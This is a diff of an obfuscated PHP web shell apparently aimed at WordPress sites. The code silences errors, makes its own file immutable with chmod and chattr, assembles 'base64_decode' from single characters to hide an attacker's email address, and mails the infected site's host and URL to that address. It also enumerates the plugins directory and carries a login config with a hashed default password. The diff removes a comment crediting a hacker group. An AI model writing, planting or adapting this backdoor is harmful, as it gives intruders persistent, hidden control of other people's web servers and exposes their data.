@@ -1,22 +1,16 @@
-
 <?php
+error_reporting(0);
 
 	
 
 $よㆁ㾼 = __FILE__;
+
 @system("chmod ugo-w $よㆁ㾼");
 @system("chattr +i $よㆁ㾼");
 
 	
 $__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
-$__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'#',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
-
-
-
-
-
-
-# function WAF
+$__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'om',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
 $dpath = isset($_SERVER["DOMAIN_PATH"]) ? $_SERVER["DOMAIN_PATH"] : $_SERVER["DOCUMENT_ROOT"];
 $d = $dpath . '/wp-content/plugins/';
 $f = array(
@@ -52,13 +46,6 @@ foreach ($f as $w) {
 
 
 
-/*
-	Author: 	Azz/IndonesianHackerRulez
-	Telegram: 	https://telegram.me/hackerman
-	YouTube: 	https://youtube.com/hackerman
-	Gmail:		rootcyberpunks@gmail.com
-	Date:		Monday, September 14, 2020
-*/
 
 if (!isset($_SESSION['trimite'])) {
     $url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
@@ -85,7 +72,7 @@ $GLOBALS['oZgNypoPRU'] = array(
     'password' => '9f7b0c36272cf9b3608ae0a33b1a4ade',//md5(hackerman1337)
     'safe_mode' => '0',
     'login_page' => 'gui',
-    'show_icons' => '0',
+    'show_icons' => '1',
     'post_encryption' => false,
     'cgi_api' => false,
 );
